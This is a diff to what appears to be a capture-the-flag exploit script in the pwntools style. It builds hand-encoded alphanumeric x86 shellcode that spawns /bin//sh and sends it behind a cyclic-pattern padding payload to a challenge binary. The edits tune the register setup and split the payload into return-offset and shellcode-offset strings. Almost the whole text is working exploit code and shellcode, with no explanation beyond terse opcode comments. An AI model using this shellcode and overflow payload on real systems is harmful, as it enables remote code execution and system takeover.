@@ -46,7 +46,6 @@ def debug(cmd=''):
 
 # info
 # gadget
-# prdi = 
 # elf, libc
 def convert(encode):
     key = []
@@ -71,13 +70,14 @@ shellcode+= 'h1b11X5b1i15b11n2J2H2J2H'+'40h2Z1P40[1C2' # /bin -> [ebx+0x32]
 shellcode+= 'h1w11X5w1A151X2P5X118'+'Y1C6Y40' # //sh -> [ebx+0x36]
 shellcode+= 'C2K2'*0x32 # inc ebx -> /bin//sh
 shellcode+= 'j4X4t' # eax=64
-shellcode+= '2J8H'*53 + '2J2' # dec eax -> 0xb
+shellcode+= '2J8H'*53 + '2J22K2' # dec eax -> 0xb
 shellcode+= nop10*1 
 shellcode+= 'P41j1X41P41Y41P41Z41X'+'2K2' # ecx<-0 edx<-0
 
-payload = '0000000000'+'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasPPPPWP'
-payload += 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaBB'
-payload += convert(shellcode)
+off_ret = '0000000000'+'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasXXXXWP'
+off_shellcode = '0000000000'+'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaai'
+
+payload = off_ret + off_shellcode + convert(shellcode)
 
 ru('What garbage do you have for us today?\n')
 # debug('b *0x80493c9')
@@ -90,5 +90,5 @@ sl(payload)
 # 41    - xor al, 0x31                     # nop
 # X     - pop    eax
 # P     - push   eax
-p.interactive()
 
+p.interactive()
